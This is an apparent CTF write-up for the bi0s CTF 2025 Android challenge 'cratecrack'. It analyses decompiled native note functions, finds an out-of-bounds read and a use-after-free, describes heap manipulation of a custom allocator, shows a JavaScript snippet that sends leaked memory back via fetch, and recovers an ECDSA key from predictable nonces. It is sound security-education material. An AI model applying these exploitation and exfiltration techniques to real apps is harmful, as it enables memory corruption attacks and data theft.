+</span><span>    </span><span style=color:#fa5c4b>if </span><span>(note_len </span><span style=color:#fe8019>< </span><span style=color:#d3869b>0x20</span><span>) {
+</span><span>      note_len </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>strlen</span><span style=color:#fdf4c1>(note_bytes)</span><span>;
+</span><span>      note </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>talloc(note_len </span><span style=color:#fe8019>& </span><span style=color:#d3869b>0xffffffff</span><span style=color:#fdf4c1>,note_bytes)</span><span>;
+</span><span>      </span><span style=color:#fe8019>*</span><span>(undefined8 </span><span style=color:#fe8019>*</span><span>)(noteBook </span><span style=color:#fe8019>+</span><span> noteBook_size </span><span style=color:#fe8019>* </span><span style=color:#d3869b>8</span><span>) </span><span style=color:#fe8019>=</span><span> note;
+</span><span>      new_size </span><span style=color:#fe8019>=</span><span> noteBook_size;
+</span><span>      noteBook_size </span><span style=color:#fe8019>=</span><span> noteBook_size </span><span style=color:#fe8019>+ </span><span style=color:#d3869b>1</span><span>;
+</span><span>    }
+</span><span>  }
+</span><span>  </span><span style=color:#fa5c4b>return</span><span> new_size;
+</span><span>}
+</span></code></pre><p>The buffer for storing <code>note</code> is allocated with <code>talloc</code>, a custom allocator similar to the one in the 2024 bi0s CTF challenge Tallocator.<p>The notebook may have upto 10 notes. Input bytes up to note_len are copied, but not more than 0x1F bytes i.e. maximum note length is 31 bytes.<h4 id=edit>edit</h4><p>Below is the <code>edit</code> method which copies new bytes over the previous note bytes. Observe that there is no size comparison between new and existing note bytes.<pre class=language-c data-lang=c style=background:#282828;color:#fdf4c1aa><code class=language-c data-lang=c><span>
+</span><span style=color:#fa5c4b>void </span><span style=color:#8ec07c>Java_bi0sctf_challenge_MainActivity_edit
+</span><span>               (</span><span style=color:#fa5c4b>long </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>param_1</span><span>,undefined8 </span><span style=color:#fdf4c1>param_2</span><span>,</span><span style=color:#fa5c4b>char </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>new_note_obj</span><span>,</span><span style=color:#fa5c4b>long </span><span style=color:#fdf4c1>note_id</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style=color:#fa5c4b>void </span><span style=color:#fe8019>*</span><span>__dest;
+</span><span>  </span><span style=color:#fa5c4b>long</span><span> lVar1;
+</span><span>  </span><span style=color:#fabd2f>size_t</span><span> note_len;
+</span><span>  </span><span style=color:#fa5c4b>char </span><span style=color:#fe8019>*</span><span>__s;
+</span><span>  
+</span><span>  </span><span style=color:#fa5c4b>if </span><span>((note_id </span><span style=color:#fe8019>< </span><span style=color:#d3869b>10</span><span>) </span><span style=color:#fe8019>&& </span><span>(note_len </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>strlen</span><span style=color:#fdf4c1>(new_note_obj)</span><span>, note_len </span><span style=color:#fe8019>< </span><span style=color:#d3869b>0x20</span><span>)) {
+</span><span>    __s </span><span style=color:#fe8019>= </span><span>(</span><span style=color:#fa5c4b>char </span><span style=color:#fe8019>*</span><span>)(</span><span style=color:#fe8019>**</span><span>(code </span><span style=color:#fe8019>**</span><span>)(</span><span style=color:#fe8019>*</span><span>param_1 </span><span style=color:#fe8019>+ </span><span style=color:#d3869b>0x5c0</span><span>))(param_1,new_note_obj,</span><span style=color:#d3869b>0</span><span>);
+</span><span>    __dest </span><span style=color:#fe8019>= *</span><span>(</span><span style=color:#fa5c4b>void </span><span style=color:#fe8019>**</span><span>)(noteBook </span><span style=color:#fe8019>+</span><span> note_id </span><span style=color:#fe8019>* </span><span style=color:#d3869b>8</span><span>);
+</span><span>    note_len </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>strlen</span><span style=color:#fdf4c1>(__s)</span><span>;
+</span><span>    </span><span style=color:#fabd2f>memcpy</span><span style=color:#fdf4c1>(__dest,__s,note_len)</span><span>;
+</span><span>    note_len </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>strlen</span><span style=color:#fdf4c1>(__s)</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>if </span><span>(note_len </span><span style=color:#fe8019>< </span><span style=color:#d3869b>0x20</span><span>) {
+</span><span>      lVar1 </span><span style=color:#fe8019>= *</span><span>(</span><span style=color:#fa5c4b>long </span><span style=color:#fe8019>*</span><span>)(noteBook </span><span style=color:#fe8019>+</span><span> note_id </span><span style=color:#fe8019>* </span><span style=color:#d3869b>8</span><span>);
+</span><span>      note_len </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>strlen</span><span style=color:#fdf4c1>(__s)</span><span>;
+</span><span>      </span><span style=color:#fe8019>*</span><span>(undefined1 </span><span style=color:#fe8019>*</span><span>)(lVar1 </span><span style=color:#fe8019>+</span><span> note_len) </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0</span><span>;
+</span><span>    }
+</span><span>  }
+</span><span>  </span><span style=color:#fa5c4b>return</span><span>;
+</span><span>}
+</span></code></pre><p>Since the <code>edit</code> method copies input until its note_len, we need a strategy to write zeroes to the note buffer. To do this:<ul><li>Create a copy of the note and replace all zero values with some placeholder, say 0xFF<li>Write this copy to the note buffer using <code>edit</code> method<li>Locate index of the last occurrence of zero in the original note<li>Slice the modified copy until this index and replace last placeholder with a zero. Write this to buffer<li>To avoid rewriting the same zero, change it in the original (track this separately)<li>Repeat this process until the entire note is covered.</ul><h4 id=getid>getId</h4><p>Here is the <code>getId</code> method.<pre class=language-c data-lang=c style=background:#282828;color:#fdf4c1aa><code class=language-c data-lang=c><span style=color:#fa5c4b>char </span><span style=color:#fe8019>* </span><span style=color:#8ec07c>Java_bi0sctf_challenge_MainActivity_getId</span><span>(</span><span style=color:#fa5c4b>long </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>param_1</span><span>,undefined8 </span><span style=color:#fdf4c1>param_2</span><span>,</span><span style=color:#fa5c4b>long </span><span style=color:#fdf4c1>noteId</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style=color:#fa5c4b>char </span><span style=color:#fe8019>*</span><span>pcVar1;
+</span><span>  </span><span style=color:#fa5c4b>long</span><span> in_FS_OFFSET;
+</span><span>  undefined1 auStack_38 [</span><span style=color:#d3869b>32</span><span>];
+</span><span>  </span><span style=color:#fa5c4b>long</span><span> local_18;
+</span><span>  
+</span><span>  local_18 </span><span style=color:#fe8019>= *</span><span>(</span><span style=color:#fa5c4b>long </span><span style=color:#fe8019>*</span><span>)(in_FS_OFFSET </span><span style=color:#fe8019>+ </span><span style=color:#d3869b>0x28</span><span>);
+</span><span>  </span><span style=color:#fa5c4b>if </span><span>(noteId </span><span style=color:#fe8019>< </span><span style=color:#d3869b>10</span><span>) {
+</span><span>    </span><span style=color:#fdf4c1>FUN_00103050(auStack_38,param_2,noteId,</span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>(undefined8 </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>)(</span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>(</span><span style=color:#fa5c4b>long </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>)(noteBook </span><span style=color:#fe8019>+</span><span style=color:#fdf4c1> noteId </span><span style=color:#fe8019>* </span><span style=color:#d3869b>8</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>+ </span><span style=color:#d3869b>0x20 </span><span style=color:#fdf4c1>))
+</span><span>    ;
+</span><span>    pcVar1 </span><span style=color:#fe8019>= </span><span>(</span><span style=color:#fa5c4b>char </span><span style=color:#fe8019>*</span><span>)(</span><span style=color:#fe8019>**</span><span>(code </span><span style=color:#fe8019>**</span><span>)(</span><span style=color:#fe8019>*</span><span>param_1 </span><span style=color:#fe8019>+ </span><span style=color:#d3869b>0x538</span><span>))(param_1,auStack_38);
+</span><span>  }
+</span><span>  </span><span style=color:#fa5c4b>else </span><span>{
+</span><span>    pcVar1 </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"Nice Try"</span><span>;
+</span><span>  }
+</span><span>  </span><span style=color:#fa5c4b>if </span><span>(</span><span style=color:#fe8019>*</span><span>(</span><span style=color:#fa5c4b>long </span><span style=color:#fe8019>*</span><span>)(in_FS_OFFSET </span><span style=color:#fe8019>+ </span><span style=color:#d3869b>0x28</span><span>) </span><span style=color:#fe8019>==</span><span> local_18) {
+</span><span>    </span><span style=color:#fa5c4b>return</span><span> pcVar1;
+</span><span>  }
+</span><span>  </span><span style=color:#fdf4c1>__stack_chk_fail()</span><span>;
+</span><span>}
+</span></code></pre><p>It takes a noteId, checks if it’s &LT10, and retrieves an associated ID string from a native note structure, returning it as a Java string. Otherwise, it returns “Nice Try”. However, since the note size is limited to 0x1F bytes, reading a value (an 0x08-byte qword) at an offset of 0x20 bytes from the note start is an out-of-bounds read vulnerability.<h4 id=deletenote>deleteNote</h4><p>The final note-related method we’ll discuss is <code>deleteNote</code>.<pre class=language-c data-lang=c style=background:#282828;color:#fdf4c1aa><code class=language-c data-lang=c><span>
+</span><span style=color:#fa5c4b>void </span><span style=color:#8ec07c>Java_bi0sctf_challenge_MainActivity_deleteNote
+</span><span>               (undefined8 </span><span style=color:#fdf4c1>param_1</span><span>,undefined8 </span><span style=color:#fdf4c1>param_2</span><span>,</span><span style=color:#fa5c4b>long </span><span style=color:#fdf4c1>note_id</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style=color:#fa5c4b>if </span><span>(note_id </span><span style=color:#fe8019>< </span><span style=color:#d3869b>10</span><span>) {
+</span><span>    </span><span style=color:#fdf4c1>tree(</span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>(undefined8 </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>)(noteBook </span><span style=color:#fe8019>+</span><span style=color:#fdf4c1> note_id </span><span style=color:#fe8019>* </span><span style=color:#d3869b>8</span><span style=color:#fdf4c1>))</span><span>;
+</span><span>    noteBook_size </span><span style=color:#fe8019>=</span><span> noteBook_size </span><span style=color:#fe8019>+ -</span><span style=color:#d3869b>1</span><span>;
+</span><span>  }
+</span><span>  </span><span style=color:#fa5c4b>return</span><span>;
+</span><span>}
+</span><span>
+</span></code></pre><p>We assume that the <code>tree</code> function is the free counterpart to the <code>talloc</code> allocator. Observe that the note pointer is not set to NULL after being freed i.e. use-after-free vulnerability.<h4 id=encryption>encryption</h4><p>The last <code>encryption</code> method leads us to the <code>trigger_encryption</code> function that carries out the following logic:<ul><li>Only allows function to run once.<li>Generate 32 bytes of randomness from /dev/urandom<li>Hash two hard-coded strings with SHA-256<li>Create two ECDSA signatures with secp256k1.<li>Serialize signatures in compact form<li>Generate a public key.<li>Verify the signatures.<li>Prepare flag plaintext with padding<li>Derive AES key and IV from previous random key.<li>AES-128-CBC encryption.<li>Serialize the public key.<li>Store signatures, ciphertext and sigining public key with <code>talloc</code> (pointers not stored)</ul><h2 id=tallocator>Tallocator</h2><p>Since there is no read functionality for our notes, we cannot abuse use-after-free by reusing them to access <code>trigger_encryption</code> output. We now look at <code>talloc</code> source code from <code>libsupernova.so</code> to explore alternate tactics.<p>We can refer <a href=https://github.com/teambi0s/bi0sCTF/blob/main/2024/Pwn/tallocator/admin/src/tallocator.c rel=noopener target=_blank>source code</a> from the 2024 bi0s CTF challenge Tallocator. Note that there is no <code>runDebug</code> logic and no RWX page for RCE exploitation in this version.<p>We can see that <code>talloc</code> mimics <code>malloc</code> behaviour, using doubly linked free lists and metadata stored near memory chunks.<p>Heap structure is as follows:<ul><li>Allocations are 16-byte aligned.<li>Each chunk stores: <ul><li><code>SIZE</code> just before the chunk pointer.<li><code>FWD</code> and <code>BKD</code> pointers (first two qwords of the chunk) for doubly linked list navigation.</ul><li>Two free lists: <ul><li>Short list for small chunks.<li>Long list for large chunks.</ul></ul><p><code>talloc</code> initializes by setting <code>HeapStart</code> with <code>sbrk</code>, defining a top chunk at <code>HeapStart + 0x38</code> for extra allocations. When allocating, it aligns the size (minimum 0x20), first tries the short free list, then the long one, and falls back to the top chunk if needed. It includes checks to avoid reallocating in-use chunks and to ensure only valid frees are accepted.<p>Insights:<ul><li>Since we can write up to 0x20 bytes into a freed chunk, we can manipulate FWD and BKD pointers.<li>This could potentially force <code>talloc</code> to return a controlled address<li>However, ASLR is enabled, so we need a leak to proceed with such a attack.</ul><h2 id=setting-up>Setting Up</h2><h3 id=docker>Docker</h3><p>Use the given <a href=https://github.com/s41nt0l3xus/CTF-writeups/blob/master/bi0sctf-2025/cratecrack/task/Handout/Dockerfile rel=noopener target=_blank>Dockerfile from the handout with some alterations</a>:<ul><li>add <code>ndk-bundle</code> to list of packages installed by <code>sdkmanager</code> to get <code>gdbserver</code> binary needed for debugging later<li>change container’s <code>CMD</code> to run <a href=https://github.com/s41nt0l3xus/CTF-writeups/blob/master/bi0sctf-2025/cratecrack/task/Handout/start.sh rel=noopener target=_blank>start.sh</a> instead of <code>socat</code></ul><p>Start the container from this image with <a href=https://github.com/s41nt0l3xus/CTF-writeups/blob/master/bi0sctf-2025/cratecrack/task/docker.sh rel=noopener target=_blank>docker.sh</a>.<h3 id=android>Android</h3><p>Using bits from the given script.py we do the following<ul><li>set up env variables<li>start emulator<li>install apk<li>start application and send a url<li>view app logs</ul><h3 id=debugger>Debugger</h3><ul><li>copy the <code>gdbserver</code> binary onto the device<li>make it executable<li>adjust Android default security features <ul><li>get root adb<li>make /system writeable<li>stop SELinux from blocking<li>unlock perf counters</ul><li>attach <code>gdbserver</code> to process<li>connect to gdb from host</ul><p>Compile above command sequences into one <a href=https://github.com/s41nt0l3xus/CTF-writeups/blob/master/bi0sctf-2025/cratecrack/task/Handout/helper rel=noopener target=_blank>helper</a> script for convenience:<h3 id=bob-wya>bob, wya?</h3><p>To debug code inside libbob.so we need its address. We can’t use <code>/proc/&LTpid>/maps</code> because it doesn’t appear by name since it was loaded as a memory-mapped segment of the APK itself.<p>Instead, we identify which mapping line in <code>/proc/&LTpid>/maps</code>corresponds to the desired library by checking the address pattern and the <code>base.apk</code> path.<p>Following shell command automates this extraction for further exploitation<pre style=background:#282828;color:#fdf4c1aa><code><span>adb shell 'grep -E "00880000.*base.apk" /proc/$(pidof -s bi0sctf.challenge)/maps | grep -oE "^[^-]*"'
+</span></code></pre><h3 id=javascriptinterface>@JavaScriptInterface</h3><p>Set up a simple web server.<pre style=background:#282828;color:#fdf4c1aa><code><span>python3 -m http.server 14444
+</span></code></pre><p>Send the url <code>http://&LTIP>:14444/exploit.html</code> where <code>exploit.html</code> is the file with the exploit.<p>To use the same server for transfer of leaked data back to us, include the following function in the exploit script.<pre style=background:#282828;color:#fdf4c1aa><code><span>function exploit()
+</span><span>{
+</span><span>  console.log("exploit");
+</span><span>  let leak = "leaked";
+</span><span>  fetch("/" + leak);
+</span><span>}
+</span></code></pre><p>This enables us to see leaks in the web server logs.<h2 id=exploitation>Exploitation</h2><h3 id=a-few-more-functions>A Few More Functions</h3><p>Implement the following JS functions to intract with <code>libbob.so</code>.<pre class=language-JavaScript data-lang=JavaScript style=background:#282828;color:#fdf4c1aa><code class=language-JavaScript data-lang=JavaScript><span style=color:#fa5c4b>function </span><span style=color:#8ec07c>add</span><span>(</span><span style=color:#fdf4c1>arr</span><span>) {
+</span><span>  </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>aespa.secure_addNote(arr)</span><span>;
+</span><span>}
+</span><span>
+</span><span style=color:#fa5c4b>function </span><span style=color:#8ec07c>edit</span><span>(</span><span style=color:#fdf4c1>idx</span><span>, </span><span style=color:#fdf4c1>arr</span><span>) {
+</span><span>  </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>aespa.secure_edit(arr, idx)</span><span>;
+</span><span>}
+</span><span>
+</span><span style=color:#fa5c4b>function </span><span style=color:#fe8019>delete</span><span>(</span><span style=color:#fdf4c1>idx</span><span>) {
+</span><span>  </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>aespa.secure_deleteNote(idx)</span><span>;
+</span><span>}
+</span><span>
+</span><span style=color:#fa5c4b>function </span><span style=color:#8ec07c>read</span><span>(</span><span style=color:#fdf4c1>idx</span><span>) {
+</span><span>  </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>aespa.secure_getId(idx)</span><span>;
+</span><span>}
+</span><span>
+</span><span style=color:#fa5c4b>function </span><span style=color:#8ec07c>encrypt</span><span>() {
+</span><span>  </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>aespa.secure_encryption()
+</span><span>}
+</span></code></pre><p>We can also set up some helper functions <code>sleep()</code> - blocking delay <code>hex()</code> - print hex <code>pack()</code> - BigInt to 8-byte array<h3 id=heap-address-leak>Heap Address Leak</h3><p>Recall that small <code>talloc</code> chunks have 8 bytes metadata and 24 bytes for use. <code>getId</code> reads 8 bytes at an offset of <code>0x20</code>, which leaks the <code>FWD</code> pointer of the next freed chunk. Thus, we can free two chunks and read one to get the other’s address.<h3 id=the-bibaboba-algo>The BibaBoba Algo</h3><p>(Btw I am very fond of these names. Good time to acknowledge <a href=https://ctftime.org/writeup/40314 rel=noopener target=_blank>this very nice writeup</a> again)<ol><li>Allocate Biba<li>Allocate Boba (size is 0x20 bytes)<li>Trigger encryption so its output lands right after Boba in memory<li>Use Boba to leak the first 8 bytes (qword) of the target data<li>Write the fake chunk into Boba’s usable space (note)<li>Free Biba!<li>Overwrite Biba’s FWD pointer to point to the fake chunk inside Boba.<li>Allocate Biba again (it comes back first from the free list).<li>Allocate the fake chunk (which now points to the next target data).<li>Make the new fake chunk the new Boba.<li>Repeat from step 4 until we read till needed.</ol><p>Running the <a href=https://github.com/s41nt0l3xus/CTF-writeups/blob/master/bi0sctf-2025/cratecrack/task/exploit.html rel=noopener target=_blank>code</a> that implements this strategy sends us the leak to the previously set-up web server.<h2 id=crypto>Crypto</h2><p>Normally, ECDSA security depends on using a secret, random, one-time nonce per signature. ECDSA is secure only if the nonce is unpredictable and used once. But in this implementation, the nonce is deterministically constructed i.e. they are predictable.<p>An ECDSA signature leaks info about the nonce via its $s$ component: $$s = \frac{z + r·d}{k} \mod n$$<p>We have two signatures $s1$ and $s2$ that both use nonces of the form $k_i = (X << 128) + m_i$ where $m_i$ is derived from message hash.<p>$s1, s2$ depend on the same secret $X$ (the upper half of the nonce), but with different known lower halves.<p>This makes it possible to set up two linear equations. By solving these modular equations, one can recover $X$ and then compute $d$ (private-key).<p>Lastly, the flag is encrypted with AES using: Key = SHA256(private-key) IV = first 16 bytes of private-key Hence, we can finally decrypt the flag!<p class=tags-data></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br></div><div class=footRight><img class="footGif noStyle" alt=footGif loading=lazy src=https://i.ibb.co/XYDpfcs/foot.gif><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=metaData href=https://exploiitm.github.io/blog/atom.xml target=_blank>RSS</a></div></div></footer>
